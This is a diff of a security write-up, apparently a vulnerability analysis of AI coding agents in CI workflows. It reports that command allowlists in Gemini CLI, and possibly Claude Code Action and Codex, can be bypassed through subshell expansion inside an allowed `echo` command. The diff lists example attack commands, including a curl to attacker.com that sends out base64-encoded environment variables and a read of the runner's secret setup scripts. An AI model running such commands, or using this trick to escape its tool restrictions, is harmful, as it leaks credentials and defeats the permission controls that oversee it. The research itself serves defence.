@@ -4,12 +4,12 @@ Tool restriction lists include commands that support subshell expansion (e.g., `
 
 ## Applicable Actions
 
-| Action | Applicable | Notes |
-|--------|-----------|-------|
-| Gemini CLI | Confirmed RCE | PoCs 1-2 achieved RCE via `run_shell_command(echo)`. The `coreTools` array in settings restricts to specific tool names, but shell expansion bypasses this. |
-| Claude Code Action | Medium confidence | `Bash(echo:*)` in `--allowedTools` is structurally similar -- allows the `echo` command through Bash, which may evaluate subshell expansion. Unconfirmed at runtime. |
-| OpenAI Codex | Medium confidence | If restricted shell commands are allowed via `codex-args`, subshell expansion may apply. Unconfirmed at runtime. |
-| GitHub AI Inference | Not applicable | No shell access -- this action calls a model API, not a shell environment. |
+| Action              | Applicable        | Notes                                                                                                                                                                |
+| ------------------- | ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Gemini CLI          | Confirmed RCE     | PoCs 1-2 achieved RCE via `run_shell_command(echo)`. The `coreTools` array in settings restricts to specific tool names, but shell expansion bypasses this.          |
+| Claude Code Action  | Medium confidence | `Bash(echo:*)` in `--allowedTools` is structurally similar -- allows the `echo` command through Bash, which may evaluate subshell expansion. Unconfirmed at runtime. |
+| OpenAI Codex        | Medium confidence | If restricted shell commands are allowed via `codex-args`, subshell expansion may apply. Unconfirmed at runtime.                                                     |
+| GitHub AI Inference | Not applicable    | No shell access -- this action calls a model API, not a shell environment.                                                                                           |
 
 Confidence note: This vector is CONFIRMED for Gemini CLI (PoCs 1-2 achieved arbitrary command execution via `echo $(env)` and `echo $(whoami)`). For Claude Code Action and OpenAI Codex, the attack is structurally similar but behavior under subshell expansion needs runtime testing to confirm exploitability.
 
@@ -70,6 +70,7 @@ From PoCs 1-2 (Gemini CLI with restricted tools):
 ```
 
 The attacker can also chain commands:
+
 - `echo $(whoami)` -- identify the runner user
 - `echo $(curl -s attacker.com/exfil?data=$(env | base64))` -- exfiltrate all env vars
 - `echo $(cat $RUNNER_TEMP/*.sh)` -- read workflow scripts including secret setup
